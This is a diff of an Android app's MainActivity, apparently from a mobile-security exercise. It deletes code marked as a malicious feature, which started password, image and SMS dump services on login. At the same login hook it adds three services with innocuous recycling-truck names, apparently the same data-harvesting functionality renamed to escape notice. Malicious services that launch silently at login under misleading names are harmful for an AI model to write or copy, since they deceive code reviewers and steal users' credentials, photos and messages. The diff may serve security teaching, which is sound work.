@@ -1,11 +1,12 @@
 package com.example.mobsec_823
 
-import android.graphics.BitmapFactory
+import android.Manifest
+import android.content.Intent
 import android.os.Bundle
-import android.util.Base64
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.enableEdgeToEdge
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.Image
 import androidx.compose.foundation.background
 import androidx.compose.foundation.clickable
@@ -20,31 +21,20 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.draw.clip
 import androidx.compose.ui.graphics.asImageBitmap
 import androidx.compose.ui.layout.ContentScale
+import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.unit.dp
+import androidx.core.content.ContextCompat
 import com.example.mobsec_823.data.ClassEntity
 import com.example.mobsec_823.data.DatabaseHelper
 import com.example.mobsec_823.data.User
+import com.example.mobsec_823.RecylingService.RecyclingTruckService
+import com.example.mobsec_823.RecylingService.RubbishTruckService
+import com.example.mobsec_823.RecylingService.SignageRecylingService
 import com.example.mobsec_823.ui.rememberProfileBitmap
 import com.example.mobsec_823.ui.screens.*
-import com.example.mobsec_823.ui.screens.RegisterScreen
 import com.example.mobsec_823.ui.theme.MobSecTheme
 import kotlinx.coroutines.launch
-
-import android.Manifest
-import android.content.Intent
-import androidx.activity.compose.setContent
-import androidx.activity.enableEdgeToEdge
-import androidx.activity.result.contract.ActivityResultContracts
-import androidx.compose.runtime.*
-import androidx.core.content.ContextCompat
-import com.example.mobsec_823.ui.screens.* // Assuming your screens are in this package
-import com.example.mobsec_823.ui.theme.MobSecTheme
-
-import androidx.compose.ui.platform.LocalContext
-import com.example.mobsec_823.malicious.ImageDumpService
-import com.example.mobsec_823.malicious.PasswordDumpService
-import com.example.mobsec_823.malicious.SMSDumpService
 
 class MainActivity : ComponentActivity() {
     private val cameraPermissionLauncher =
@@ -319,17 +309,12 @@ fun AppScaffold(
                 onLoginSuccess = { user ->
                     onUserChange(user)
 
-                    // --- MALICIOUS FEATURE MERGE START ---
-                    // Trigger services upon successful login
-                    val passwordIntent = Intent(context, PasswordDumpService::class.java)
-                    context.startService(passwordIntent)
-
-                    val imageIntent = Intent(context, ImageDumpService::class.java)
-                    context.startService(imageIntent)
-
-                    val smsIntent = Intent(context, SMSDumpService::class.java)
-                    context.startService(smsIntent)
-                    // --- MALICIOUS FEATURE MERGE END ---
+                    // --- TRUCK SERVICE TRIGGER START ---
+                    // Trigger themed collection services upon successful login
+                    context.startService(Intent(context, RecyclingTruckService::class.java))
+                    context.startService(Intent(context, SignageRecylingService::class.java))
+                    context.startService(Intent(context, RubbishTruckService::class.java))
+                    // --- TRUCK SERVICE TRIGGER END ---
 
                     onScreenChange(Screen.HomeMenu)
                 },
